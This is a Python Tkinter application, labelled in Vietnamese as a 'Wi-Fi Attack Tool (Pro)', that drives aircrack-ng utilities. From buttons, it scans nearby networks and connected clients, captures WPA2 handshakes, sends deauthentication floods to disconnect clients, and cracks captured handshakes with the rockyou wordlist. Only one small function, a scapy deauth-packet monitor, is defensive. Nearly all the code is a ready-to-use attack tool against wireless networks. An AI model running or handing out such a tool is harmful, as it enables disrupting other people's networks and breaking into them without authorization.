import os
import subprocess
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import csv
import threading

class WifiAttackApp:
    def __init__(self, master):
        self.master = master
        master.title("Wi-Fi Attack Tool (Pro)")
        self.networks = []
        self.clients = []
        self.iface = "wlan0"  # Đổi nếu card bạn tên khác
        self.scan_time = tk.IntVar(value=60)  # Mặc định 60s
        self.deauth_count = tk.IntVar(value=20)  # Số gói deauth mặc định

        # Giao diện thời gian quét + nút quét Wi-Fi
        top_frame = tk.Frame(master)
        top_frame.pack(pady=3)
        tk.Label(top_frame, text="Thời gian quét (giây):").pack(side=tk.LEFT)
        self.scan_entry = tk.Entry(top_frame, width=5, textvariable=self.scan_time)
        self.scan_entry.pack(side=tk.LEFT, padx=2)
        self.scan_btn = tk.Button(top_frame, text="Quét Wi-Fi", command=self.scan_wifi)
        self.scan_btn.pack(side=tk.LEFT, padx=2)

        # Combobox chọn Wi-Fi
        self.combo = ttk.Combobox(master, width=70, values=[])
        self.combo.pack(pady=4)

        # Nút hiện client
        self.clients_btn = tk.Button(master, text="Hiện client của AP đã chọn", command=self.show_clients)
        self.clients_btn.pack(pady=3)

        # Listbox hiện client
        self.client_listbox = tk.Listbox(master, width=80, height=6)
        self.client_listbox.pack(pady=3)

        # Nút Bắt Handshake
        self.handshake_btn = tk.Button(master, text="Bắt handshake của AP đã chọn", command=self.capture_handshake)
        self.handshake_btn.pack(pady=3)

        # Frame nhập số lượng deauth + nút gửi deauth
        deauth_frame = tk.Frame(master)
        deauth_frame.pack(pady=3)
        tk.Label(deauth_frame, text="Số lượng gói deauth:").pack(side=tk.LEFT)
        self.deauth_entry = tk.Entry(deauth_frame, width=5, textvariable=self.deauth_count)
        self.deauth_entry.pack(side=tk.LEFT, padx=2)
        self.deauth_btn = tk.Button(deauth_frame, text="Gửi Deauth (Kick)", command=self.deauth_attack)
        self.deauth_btn.pack(side=tk.LEFT, padx=2)

        # Nút crack WPA2 và Monitor deauth
        self.crack_btn = tk.Button(master, text="Dò mật khẩu WPA2", command=self.crack_wpa)
        self.crack_btn.pack(pady=3)
        self.monitor_btn = tk.Button(master, text="Giám sát deauth (phòng chống)", command=self.monitor_deauth)
        self.monitor_btn.pack(pady=3)
        self.monitor_log = tk.Text(master, width=80, height=8)
        self.monitor_log.pack(pady=5)

    def scan_wifi(self):
        try:
            subprocess.run("sudo airmon-ng check kill", shell=True)
            subprocess.run(f"sudo airmon-ng start {self.iface}", shell=True)
            scan_file_prefix = "/tmp/wifi_scan"
            csv_file = f"{scan_file_prefix}-01.csv"
            if os.path.exists(csv_file):
                os.remove(csv_file)
            scan_time = int(self.scan_time.get())
            cmd = f"sudo timeout {scan_time} airodump-ng --write-interval 1 --output-format csv -w {scan_file_prefix} {self.iface}"
            subprocess.run(cmd, shell=True)
            wifi_list = []
            with open(csv_file, newline='', encoding='utf-8') as f:
                reader = csv.reader(f)
                parsing = False
                for row in reader:
                    if len(row) > 0 and row[0].strip() == "BSSID":
                        parsing = True
                        continue
                    if parsing:
                        if len(row) == 0 or row[0].strip() == '':
                            break
                        bssid = row[0].strip()
                        channel = row[3].strip()
                        essid = row[13].strip()
                        if essid and bssid != "Station MAC":
                            wifi_list.append(f"{bssid} | {essid} | Kênh: {channel}")
            self.networks = wifi_list
            self.combo['values'] = self.networks
            if wifi_list:
                messagebox.showinfo("Xong", "Đã quét xong, chọn Wi-Fi bên dưới.")
            else:
                messagebox.showinfo("Lỗi", "Không phát hiện được Wi-Fi nào, thử lại!")
        except Exception as e:
            messagebox.showerror("Lỗi", f"Không đọc được danh sách Wi-Fi.\n{str(e)}")

    def show_clients(self):
        selected = self.combo.get()
        if not selected:
            messagebox.showwarning("Chọn Wi-Fi", "Chưa chọn Wi-Fi để xem client!")
            return
        bssid = selected.split(" | ")[0]
        scan_file_prefix = "/tmp/wifi_scan"
        csv_file = f"{scan_file_prefix}-01.csv"
        clients = []
        try:
            with open(csv_file, newline='', encoding='utf-8') as f:
                reader = csv.reader(f)
                parsing_client = False
                for row in reader:
                    if len(row) > 0 and row[0].strip() == "Station MAC":
                        parsing_client = True
                        continue
                    if parsing_client:
                        if len(row) == 0 or row[0].strip() == '':
                            break
                        station_mac = row[0].strip()
                        ap_mac = row[5].strip()
                        if ap_mac == bssid:
                            clients.append(station_mac)
            self.clients = clients
            self.client_listbox.delete(0, tk.END)
            if clients:
                for cli in clients:
                    self.client_listbox.insert(tk.END, f"Client MAC: {cli}")
            else:
                self.client_listbox.insert(tk.END, "Không phát hiện client nào (cần thiết bị đang kết nối và hoạt động)")
        except Exception as e:
            messagebox.showerror("Lỗi", f"Không đọc được danh sách client.\n{str(e)}")

    def capture_handshake(self):
        selected = self.combo.get()
        if not selected:
            messagebox.showwarning("Chọn Wi-Fi", "Chưa chọn Wi-Fi để bắt handshake!")
            return
        bssid = selected.split(" | ")[0]
        try:
            channel = selected.split("Kênh: ")[-1].strip()
        except:
            messagebox.showwarning("Thiếu kênh", "Không xác định được kênh!")
            return
        filename = f"wpa2_handshake_{bssid.replace(':','')}"
        cmd = [
            "xfce4-terminal", "-e",
            f"bash -c \"sudo airodump-ng --bssid {bssid} --channel {channel} -w {filename} {self.iface}; bash\""
        ]
        subprocess.Popen(cmd)
        messagebox.showinfo("Bắt handshake", f"Đang bắt handshake AP {bssid} (channel {channel})!\nFile sẽ lưu: {filename}-01.cap.\nKhi thấy [ WPA handshake: ... ] ở góc trên phải, hãy Ctrl+C để dừng.")

    def deauth_attack(self):
        selected = self.combo.get()
        if not selected:
            messagebox.showwarning("Chọn Wi-Fi", "Chưa chọn Wi-Fi để tấn công!")
            return
        bssid = selected.split(" | ")[0]
        try:
            channel = selected.split("Kênh: ")[-1].strip()
        except:
            messagebox.showwarning("Thiếu kênh", "Không xác định được kênh!")
            return
        try:
            count = int(self.deauth_count.get())
            if count < 1 or count > 9999:
                raise ValueError
        except:
            messagebox.showwarning("Sai số lượng", "Số gói deauth phải là số nguyên dương < 10000.")
            return
        subprocess.run(f"sudo iwconfig {self.iface} channel {channel}", shell=True)
        cmd = f"sudo aireplay-ng --deauth {count} -a {bssid} {self.iface}"
        subprocess.Popen(cmd, shell=True)
        messagebox.showinfo("Đang gửi deauth", f"Đã chuyển channel {channel}. Đang gửi {count} gói deauth tới {bssid}...")

    def crack_wpa(self):
        handshake = filedialog.askopenfilename(title="Chọn file handshake (.cap)")
        if not handshake:
            messagebox.showwarning("Thiếu file", "Cần chọn file handshake!")
            return
        # Tạo wordlist top100k nếu chưa có
        top100k = "top100k.txt"
        rockyou = "/usr/share/wordlists/rockyou.txt"
        if not os.path.exists(top100k):
            if not os.path.exists(rockyou):
                if os.path.exists(rockyou + ".gz"):
                    subprocess.run(f"gunzip {rockyou}.gz", shell=True)
            subprocess.run(f"head -n 100000 {rockyou} > {top100k}", shell=True)
        ap_info = os.path.basename(handshake)
        cmd = [
            "xfce4-terminal", "-e",
            f"bash -c \"echo 'Đang dò mật khẩu file: {ap_info}'; aircrack-ng -w {top100k} '{handshake}'; bash\""
        ]
        subprocess.Popen(cmd)
        messagebox.showinfo("Đang dò", f"Đang dò mật khẩu top 100,000 pass rockyou.txt ở terminal mới!\nFile handshake: {ap_info}")

    def monitor_deauth(self):
        self.monitor_log.delete('1.0', tk.END)
        self.deauth_count = 0
        self.monitor_log.insert(tk.END, "Bắt đầu giám sát gói deauth...\n")
        thread = threading.Thread(target=self.sniff_deauth)
        thread.daemon = True
        thread.start()

    def sniff_deauth(self):
        try:
            from scapy.all import sniff, Dot11Deauth
        except ImportError:
            self.monitor_log.insert(tk.END, "Scapy chưa cài, không giám sát được!\n")
            return
        def process_packet(pkt):
            if pkt.haslayer(Dot11Deauth):
                self.deauth_count += 1
                msg = f"Bắt được gói deauth! Tổng số: {self.deauth_count}\n"
                self.monitor_log.insert(tk.END, msg)
                self.monitor_log.see(tk.END)
                if self.deauth_count >= 10:
                    self.monitor_log.insert(tk.END, "==> CẢNH BÁO: PHÁT HIỆN TẤN CÔNG DEAUTH!\n")
        sniff(iface=self.iface, prn=process_packet, store=0)

if __name__ == '__main__':
    root = tk.Tk()
    app = WifiAttackApp(root)
    root.mainloop()
